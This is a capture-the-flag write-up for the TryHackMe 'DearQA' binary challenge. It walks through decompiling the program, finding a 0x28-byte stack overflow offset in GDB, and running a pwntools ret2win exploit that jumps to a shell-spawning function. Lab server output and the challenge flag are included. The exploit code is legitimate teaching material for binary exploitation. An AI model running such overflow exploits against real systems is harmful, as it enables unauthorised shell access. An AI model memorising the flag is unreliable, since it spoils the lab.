### DearQA TryHackMe

### Difficulty = Easy

### IP Address = 10.10.175.23 

### Basic File Checks

```
┌──(mark㉿haxor)-[~/Desktop/B2B/THM/DearQA]
└─$ file DearQA.DearQA 
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
                                                                                                                                                                                                                  
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/DearQA]
└─$ checksec DearQA.DearQA       
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/B2B/THM/DearQA/DearQA.DearQA'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We're working with a x64 binary and no protection is enabled on the binary

I'll run it to get an overview of what it does

```
└─$ ./DearQA.DearQA 
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: pwner
Hello: pwner
```

So it just takes in our input and echo's it back

Using ghidra i'll decompile the binary 

Here's the decompiled main function

```

undefined8 main(void)

{
  undefined input [32];
  
  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What\'s your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,input);
  printf("Hello: %s\n",input);
  return 0;
}
```

We see it just asks for input then prints it back but the issue there is that the input buffer can only hold up to 32 bytes of data and while scanf is called no amount of specified bytes is asssigned meaning we can cause a buffer overflow here

There's another function called vuln()

```

void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

This grants us a bash shell

So we know that this is a ret2win style chall 

To take advantage of this we need to get the offset then overwrite the rip with the address of the vuln function

Using gdb i'll get the offset

```
└─$ gdb -q DearQA.DearQA
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from DearQA.DearQA...
(No debugging symbols found in DearQA.DearQA)
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004006c3 <+0>:     push   rbp
   0x00000000004006c4 <+1>:     mov    rbp,rsp
   0x00000000004006c7 <+4>:     sub    rsp,0x20
   0x00000000004006cb <+8>:     mov    edi,0x400803
   0x00000000004006d0 <+13>:    call   0x400520 <puts@plt>
   0x00000000004006d5 <+18>:    mov    edi,0x400818
   0x00000000004006da <+23>:    call   0x400520 <puts@plt>
   0x00000000004006df <+28>:    mov    edi,0x40083e
   0x00000000004006e4 <+33>:    mov    eax,0x0
   0x00000000004006e9 <+38>:    call   0x400530 <printf@plt>
   0x00000000004006ee <+43>:    mov    rax,QWORD PTR [rip+0x20051b]        # 0x600c10 <stdout@@GLIBC_2.2.5>
   0x00000000004006f5 <+50>:    mov    rdi,rax
   0x00000000004006f8 <+53>:    call   0x400570 <fflush@plt>
   0x00000000004006fd <+58>:    lea    rax,[rbp-0x20]
   0x0000000000400701 <+62>:    mov    rsi,rax
   0x0000000000400704 <+65>:    mov    edi,0x400851
   0x0000000000400709 <+70>:    mov    eax,0x0
   0x000000000040070e <+75>:    call   0x400580 <__isoc99_scanf@plt>
   0x0000000000400713 <+80>:    lea    rax,[rbp-0x20]
   0x0000000000400717 <+84>:    mov    rsi,rax
   0x000000000040071a <+87>:    mov    edi,0x400854
   0x000000000040071f <+92>:    mov    eax,0x0
   0x0000000000400724 <+97>:    call   0x400530 <printf@plt>
   0x0000000000400729 <+102>:   mov    eax,0x0
   0x000000000040072e <+107>:   leave  
   0x000000000040072f <+108>:   ret    
End of assembler dump.
gef➤  b *main+107
Breakpoint 1 at 0x40072e
gef➤  r
Starting program: /home/mark/Desktop/B2B/THM/DearQA/DearQA.DearQA 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: pwnerhacke
Hello: pwnerhacke

Breakpoint 1, 0x000000000040072e in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2cf  →  "/home/mark/Desktop/B2B/THM/DearQA/DearQA.DearQA"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde30  →  "pwnerhacker"
$rbp   : 0x007fffffffde50  →  0x0000000000000001
$rsi   : 0x000000006012a0  →  "Hello: pwnerhacke\n new in developing\n"
$rdi   : 0x007fffffffd8d0  →  0x007ffff7e1ae70  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x0000000040072e  →  <main+107> leave 
$r8    : 0x00000000400852  →  0x3a6f6c6c65480073 ("s"?)
$r9    : 0x73              
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2ff  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde30│+0x0000: "pwnerhacker"  ← $rsp
0x007fffffffde38│+0x0008: 0x007fff0072656b ("ker"?)
0x007fffffffde40│+0x0010: 0x0000000000000000
0x007fffffffde48│+0x0018: 0x007ffff7ffdad0  →  0x007ffff7fcb000  →  0x03010102464c457f
0x007fffffffde50│+0x0020: 0x0000000000000001     ← $rbp
0x007fffffffde58│+0x0028: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffde60│+0x0030: 0x007fffffffdf50  →  0x007fffffffdf58  →  0x00000000000038 ("8"?)
0x007fffffffde68│+0x0038: 0x000000004006c3  →  <main+0> push rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40071f <main+92>        mov    eax, 0x0
     0x400724 <main+97>        call   0x400530 <printf@plt>
     0x400729 <main+102>       mov    eax, 0x0
 →   0x40072e <main+107>       leave  
     0x40072f <main+108>       ret    
     0x400730 <__libc_csu_init+0> push   r15
     0x400732 <__libc_csu_init+2> mov    r15d, edi
     0x400735 <__libc_csu_init+5> push   r14
     0x400737 <__libc_csu_init+7> mov    r14, rsi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "DearQA.DearQA", stopped 0x40072e in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40072e → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

I'll search for where our input is stored on the stack with the address of rip

```
gef➤  search-pattern pwnerhacke
[+] Searching 'pwnerhacke' in memory
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x6012a7 - 0x6012c8  →   "pwnerhacke\nm new in developing\n" 
  0x6016b0 - 0x6016bc  →   "pwnerhacke\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffde30 - 0x7fffffffde3a  →   "pwnerhacke" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x40072e in main; saved rip = 0x7ffff7df018a
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
gef➤
```

Now doing the math we get the offset `0x7fffffffde58 - 0x7fffffffde30 = 0x28`

Also using gdb i'll get the address for the vuln function

```
└─$ gdb -q DearQA.DearQA
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from DearQA.DearQA...
(No debugging symbols found in DearQA.DearQA)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x00000000004004f0  _init
0x0000000000400520  puts@plt
0x0000000000400530  printf@plt
0x0000000000400540  __libc_start_main@plt
0x0000000000400550  execve@plt
0x0000000000400560  __gmon_start__@plt
0x0000000000400570  fflush@plt
0x0000000000400580  __isoc99_scanf@plt
0x0000000000400590  _start
0x00000000004005c0  deregister_tm_clones
0x0000000000400600  register_tm_clones
0x0000000000400640  __do_global_dtors_aux
0x0000000000400660  frame_dummy
0x0000000000400686  vuln
0x00000000004006c3  main
0x0000000000400730  __libc_csu_init
0x00000000004007a0  __libc_csu_fini
0x00000000004007a4  _fini
gef➤
```

Here's the exploit

```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './DearQA.DearQA'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 0x28
padding = "A" * offset 
vuln = 0x0000000000400686
# vuln = elf.functions['vuln']

# Build the payload
payload = flat([
    padding,
    vuln
])

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```

Running it we get shell

```
└─$ python3 exploit.py
[+] Starting local process './DearQA.DearQA': pid 7673
[*] Switching to interactive mode
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06
Congratulations!
You have entered in the secret function!
$ ls -al
total 20
drwxr-xr-x  2 mark mark 4096 Feb 14 15:09 .
drwxr-xr-x 14 mark mark 4096 Feb 14 14:53 ..
-rwx--x--x  1 mark mark 7712 Feb 14 14:52 DearQA.DearQA
-rw-r--r--  1 mark mark 1068 Feb 14 15:09 exploit.py
$ 
```

Now i'll run it on the remote server

But i set it to debug mode cause i don't know why i don't get any output if the context level is set to info but still u can get a reverse shell then get the flag

Anyways here's it

```
└─$ python3 exploit.py REMOTE 10.10.175.23 5700
[+] Opening connection to 10.10.175.23 on port 5700: Done
/home/mark/Desktop/B2B/THM/DearQA/exploit.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat([
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  86 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received 0xe bytes:
    b'Welcome dearQA'
Welcome dearQA[DEBUG] Received 0x16c bytes:
    00000000  0d 0a 49 20  61 6d 20 73  79 73 61 64  6d 69 6e 2c  │··I │am s│ysad│min,│
    00000010  20 69 20 61  6d 20 6e 65  77 20 69 6e  20 64 65 76  │ i a│m ne│w in│ dev│
    00000020  65 6c 6f 70  69 6e 67 0d  0a 57 68 61  74 27 73 20  │elop│ing·│·Wha│t's │
    00000030  79 6f 75 72  20 6e 61 6d  65 3a 20 41  41 41 41 41  │your│ nam│e: A│AAAA│
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 86  5e 46 40 5e  40 5e 40 5e  40 5e 40 5e  │AAA·│^F@^│@^@^│@^@^│
    00000070  40 0d 0a 48  65 6c 6c 6f  3a 20 41 41  41 41 41 41  │@··H│ello│: AA│AAAA│
    00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000a0  41 41 86 06  40 0d 0a 43  6f 6e 67 72  61 74 75 6c  │AA··│@··C│ongr│atul│
    000000b0  61 74 69 6f  6e 73 21 0d  0a 59 6f 75  20 68 61 76  │atio│ns!·│·You│ hav│
    000000c0  65 20 65 6e  74 65 72 65  64 20 69 6e  20 74 68 65  │e en│tere│d in│ the│
    000000d0  20 73 65 63  72 65 74 20  66 75 6e 63  74 69 6f 6e  │ sec│ret │func│tion│
    000000e0  21 0d 0a 62  61 73 68 3a  20 63 61 6e  6e 6f 74 20  │!··b│ash:│ can│not │
    000000f0  73 65 74 20  74 65 72 6d  69 6e 61 6c  20 70 72 6f  │set │term│inal│ pro│
    00000100  63 65 73 73  20 67 72 6f  75 70 20 28  34 34 36 29  │cess│ gro│up (│446)│
    00000110  3a 20 49 6e  61 70 70 72  6f 70 72 69  61 74 65 20  │: In│appr│opri│ate │
    00000120  69 6f 63 74  6c 20 66 6f  72 20 64 65  76 69 63 65  │ioct│l fo│r de│vice│
    00000130  0d 0a 62 61  73 68 3a 20  6e 6f 20 6a  6f 62 20 63  │··ba│sh: │no j│ob c│
    00000140  6f 6e 74 72  6f 6c 20 69  6e 20 74 68  69 73 20 73  │ontr│ol i│n th│is s│
    00000150  68 65 6c 6c  0d 0a 63 74  66 40 64 65  61 72 71 61  │hell│··ct│f@de│arqa│
    00000160  3a 2f 68 6f  6d 65 2f 63  74 66 24 20               │:/ho│me/c│tf$ │
    0000016c








ctf@dearqa:/home/ctf$ $ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1 bytes:
    b'i'
i[DEBUG] Received 0x9f bytes:
    b'd\r\n'
    b'uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)\r\n'
    b'ctf@dearqa:/home/ctf$ '


ctf@dearqa:/home/ctf$ $ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0xe bytes:
    b'cat flag.txt\r\n'

[DEBUG] Received 0x2d bytes:
    b'THM{PWN_1S_V3RY_E4SY}\r\n'
    b'ctf@dearqa:/home/ctf$ '

ctf@dearqa:/home/ctf$ $
```

And we're done 🤓

<br> <br>
[Back To Home](../../index.md)
